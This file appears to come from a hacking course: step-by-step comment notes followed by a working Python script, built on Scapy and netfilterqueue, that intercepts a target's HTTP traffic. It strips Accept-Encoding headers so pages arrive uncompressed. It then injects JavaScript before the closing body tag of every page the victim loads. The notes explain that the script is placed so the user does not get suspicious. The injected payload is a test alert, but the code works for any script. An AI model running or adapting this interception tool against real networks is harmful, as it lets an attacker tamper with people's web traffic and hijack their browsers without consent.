# ●In the last section, we built a program that we can use to intercept downloads and
# # replace any file
# ●This was an example of modifying http packets as they flow through our computer
# But in this example, instead of creating a new response like we did in previous section, we are going
# to modify the data sent in the raw layer
# So by the end of this section, we will understand how to modify anything that gets sent in raw layer
# In this example we will be modifying html code - thus we will build a program which can be used to modify any part of
# any web page loaded by our target and we will also be injecting javascript code in the
# target web page and see how dangerous it is

# 1) This program is going to work similar to the way that Replace downloads - file interceptor program was working.
# So it will be able to see the requests and responses
# -> Instead of creating a new response, we are going to modify parts of response,so that we can modify parts of html code that will be sent to the
# target

# 2) Run the iptables rules, so that packets are redirected to nfqueue
#
# 3) Run the code injector program
# -> Observation: Html code in inspect page and in raw/load of scapy output in response looks different
# Reason:
# a) If we look at the load of the request for this response we can see
# a field called accept-encoding and the value of this field is gzip, deflate
# -> This means that in the request we are saying that we want a website called bing.com and in the same request
# we are saying, that " i can accept GZIP encoding"
# -> So the server is going to receive this and it is going to see that the browser which is us, is able to understand gzip
# encoding - an encoding technique to compress html code
# -> Therefore when the server wants to send us the response, it will first compress the response to a gzip format, send it to us, Hence we
# see the response as bytes
#
# Request
# ###[Raw] ####
# load = 'GET /HTTP/1.1'.... \nAccept-Encoding: gzip,deflate\r\n Connection: keep-alive
# ....
#
# Response
# ###[Raw] ####
# load = '\xfd\xe3\xb7.......'

# 4) Browser will decode this to html code which it  can understand
# -> This is a problem for us, because we cant inject anything into it
# unless we can read the code
#
# 5) Thus the first step in our program will be decoding this and getting the html code in plain
# text instead of reading it in gzip format
# -> Thus our goal is to convert gzip html code to a plain text html code, so that we can read it and modify it
# -> If we modify the load of request and remove Accept-Encoding: gzip then browser will
# think that we cannot understand gzip format and it will send us the data in plain text html code
# -> We can do the same with the help of regex
#
# -> To filter accept encoding of type: "Accept:Encoding: gzip,deflate\r\n"
# -> Regex Expression: Accept-Encoding:.*?\\r\\n
#
# 6) Now we will use python program to filter the text based on the regex expression
# -> re is regex module
# import re
# re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
# -> Here replace text is given as empty

# 7) create new packet with the modified load and
# modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
# new_packet = set_load(scapy_packet, modified_load)
# packet.set_payload(str(new_packet))

# -> Thus code until now: whenever it finds a text , that matches the regex in its load, it will remove all of this and the
# result of this is the webserver is going to think that - we dont understand gzip encoding and therefore
# server will send us back the html code in plain text

# 8) Now run 1code-injector.py in kali machine , go to bing.com and we can see in kali machine program output 1-code-injector.py output -> in plain text
#

#9) So far using our code, we are able to see requests and responses and we are even
# able to see plaintext of html code of the pages, that person is loading
#
# Also we are able to see that HTML code is being sent in the load field of the raw layer of
# each response packet.

# 10) Now we will inject a javascript code that will only show an alert on screen
# -> script that we will execute : <script>alert('test')</script>;
# -> We can put the script in the last tag. Mostly <body> is the last tag
# in html code
# -> Also <body> tag will occur only once while other tags repeat
# -> If we insert javascript code at the end, page will get loaded first and then
# javascript code gets executed, so that it wont delay the page and user wont
# get suspicious


# 11) We will use .replace() of python while handling response
# -> Then we create new packet from modified load and set the payload
# modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test')</script></body>")
# new_packet = set_load(scapy_packet, modified_load)
# packet.set_payload(str(new_packet))
#
# 12) Now if we run our code 1code-injector.py in kali machie and run bing.com, we will
# get an alert in browser once the page loads, which means the javascript code that we injected got executed in the target page



#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re




def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet,modified_load)
            packet.set_payload(str(new_packet))
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport ==80:
            print("HTTP response")
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test')</script></body>")
            new_packet = set_load(scapy_packet,modified_load )
            packet.set_payload(str(new_packet))


    packet.accept()



queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet)
queue.run()
